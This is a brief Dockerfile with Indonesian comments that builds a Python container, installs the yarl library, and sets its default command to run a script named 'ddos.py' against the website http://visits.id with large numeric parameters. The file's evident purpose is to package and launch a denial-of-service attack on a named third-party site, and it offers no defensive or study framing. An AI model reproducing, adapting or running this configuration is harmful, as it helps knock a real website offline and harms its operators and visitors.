# Gunakan image Python terbaru
FROM python:latest  

# Set direktori kerja di dalam container
WORKDIR /app  

# Salin semua file ke dalam container
COPY . .  

# Install dependencies (pastikan ada `requirements.txt`)
RUN pip install yarl  

# Jalankan aplikasi (misal `script.py`)
CMD ["python3", "ddos.py", "http://visits.id", "1600", "800", "100000"]
